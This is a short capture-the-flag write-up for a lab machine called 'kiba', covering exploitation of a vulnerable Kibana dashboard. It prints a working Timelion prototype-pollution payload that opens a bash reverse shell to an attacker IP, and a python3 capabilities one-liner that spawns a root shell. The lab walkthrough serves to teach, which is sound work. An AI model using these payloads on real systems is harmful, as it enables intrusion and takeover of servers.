# kiba

### kiba
Nmap scan shows ports 22,80 and 5601 open. By accessing `http://target_IP:5601` I can access a kibana dashboard. Kibana is an open-source data visualization dashboard for Elasticsearch.
![image](https://github.com/user-attachments/assets/52f4a0e4-160b-4088-bb72-0ecfb1157be4)<br />
From online search I found that this version of kibana is vulnerable to prototype pollution which leads to RCE, [CVE-2019-7609](https://github.com/LandGrey/CVE-2019-7609).
To exploit this, add go to the `timelion` section and add the following payload: 

    .es(*).props(label.__proto__.env.AAAA='require("child_process").exec("bash -c \'bash -i>& /dev/tcp/10.14.90.188/9001 0>&1\'");//')
    .props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ')
Then visit the `canvas` section and the reverse shell should pop up:<br />
![image](https://github.com/user-attachments/assets/232b2398-41f9-4d0d-9a23-c843b902eb71)<br />
Now for privesc, I run linpeas and get this:<br />
![image](https://github.com/user-attachments/assets/9033ed8e-1d7a-4e96-a602-49719e615a7e)<br />
There's a very good explanation [here](https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/) about capabilities and how to exploit them.<br />
To exploit this instance, just move to `/home/kiba/.hackmeplease` and run `./python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'` to spawn a shell as root!

